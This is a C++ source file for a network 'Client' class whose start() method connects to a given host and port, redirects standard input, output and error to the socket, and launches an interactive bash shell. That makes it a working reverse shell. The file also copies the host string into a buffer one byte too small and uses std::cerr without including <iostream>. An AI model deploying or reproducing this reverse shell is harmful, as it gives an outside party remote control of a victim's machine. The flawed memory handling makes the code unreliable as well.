#include <string>
#include <stdexcept> // std::invalid_argument
#include <unistd.h> // dup2, execl, STDOUT_FILENO, STDIN_FILENO, STDERR_FILENO
#include <string.h> // strlen
#include "client.h"
#include "log.h"

Client::Client(char *host, int port) {
	if (host == NULL) {
		throw std::invalid_argument("Invalid host");
	}
	size_t hostLen = strlen(host);
	this->host = new char[hostLen];
	strcpy(this->host, host);

	if (port <= 0 || port > 65535) {
		throw std::invalid_argument("Invalid server port");
	}
	this->port = port;
}


Client::~Client() {
	delete[] this->host;
}


int Client::start() {
	if (establishConnection() != 0) {
		std::cerr << "Failed to establish connection to:\n\t" << this->host << ":" << this->port << std::endl;
		return -1;
	}

	// Start a bash shell and redirect its stdout, stdin and stderr to the socket
	dup2(this->sockfd, STDOUT_FILENO);
	dup2(this->sockfd, STDIN_FILENO);
	dup2(this->sockfd, STDERR_FILENO);
	execl("/bin/bash", "/bin/bash", "-i", NULL);

	return 0;
}
